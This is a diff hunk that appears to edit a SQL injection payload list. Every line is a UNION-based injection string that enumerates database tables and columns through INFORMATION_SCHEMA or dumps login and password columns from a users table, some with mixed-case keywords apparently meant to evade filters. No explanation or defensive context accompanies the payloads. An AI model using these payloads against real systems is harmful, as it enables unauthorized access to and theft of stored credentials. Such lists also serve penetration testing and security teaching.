@@ -11,12 +11,12 @@
 
     ' union select login,password from users-- -
     ' union all select 1, (select password from users) -- 
-    ' UNION SELECT 2, table_name from INFORMATION_SCHEMA.tables
-    ' UNION SELECT 2, group_concat(table_name) from INFORMATION_SCHEMA.TABLES
-    ' UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
-    ' UNION SELECT 1, group_concat(COLUMN_NAME), FROM INFORMATION_SCHEMA.COLUMNS
+    ' UNION SELECT 2, table_name from INFORMATION_SCHEMA.tables --
+    ' UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
+    ' UNION SELECT 2, group_concat(table_name) from INFORMATION_SCHEMA.TABLES --
+    ' UNION SELECT 1, group_concat(COLUMN_NAME), FROM INFORMATION_SCHEMA.COLUMNS --
+    ' UNION SELECT 2, group_concat(table_name) from INFORMATION_SCHEMA.tables where table_SCHEMA=database()-- -
     ' union select 1, GROUP_CONCAT(login SEPARATOR ', '), GROUP_CONCAT(password SEPARATOR ', ') FROM users# –– -
-    ' UNION SELECT 2, group_concat(table_name) from INFORMATION_SCHEMA.tables where table_SCHEMA=database()--
     ' UNIon SELect 1, (SELect GROup_CONcat(COLumn_NAMe) FROm INFormation_SCHema.COLumns WHEre TABle_NAMe='users')-- -
     ' UNIon SELect 1, (SELect GROup_CONcat(TABle_NAMe) FROm INFormation_SCHema.TABles WHEre TABle_SCHema=DATabase())-- -
     ' union select table_name, GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns where table_name = 'users'# –– -
